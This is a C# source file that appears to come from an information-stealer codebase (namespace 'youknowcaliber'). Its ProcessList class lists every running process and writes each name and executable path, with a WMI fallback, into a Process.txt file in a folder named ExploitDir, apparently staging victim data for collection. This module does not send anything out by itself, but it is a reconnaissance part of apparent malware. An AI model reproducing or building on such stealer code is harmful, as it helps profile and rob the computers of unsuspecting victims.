﻿using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace youknowcaliber
{
	internal class ProcessList
	{
		public static void WriteProcesses()
		{
			string exploitDir = Help.ExploitDir;
			foreach (Process process in Process.GetProcesses())
			{
				File.AppendAllText(exploitDir + "\\Process.txt", string.Concat(new string[]
				{
					"NAME: ",
					process.ProcessName,
					"\nEXE: ",
					ProcessList.ProcessExecutablePath(process),
					"\n\n"
				}));
			}
		}

		public static string ProcessExecutablePath(Process process)
		{
			try
			{
				return process.MainModule.FileName;
			}
			catch
			{
				string queryString = "SELECT ExecutablePath, ProcessID FROM Win32_Process";
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(queryString);
				foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
				{
					ManagementObject managementObject = (ManagementObject)managementBaseObject;
					object obj = managementObject["ProcessID"];
					object obj2 = managementObject["ExecutablePath"];
					bool flag = obj2 != null && obj.ToString() == process.Id.ToString();
					if (flag)
					{
						return obj2.ToString();
					}
				}
			}
			return "";
		}
	}
}
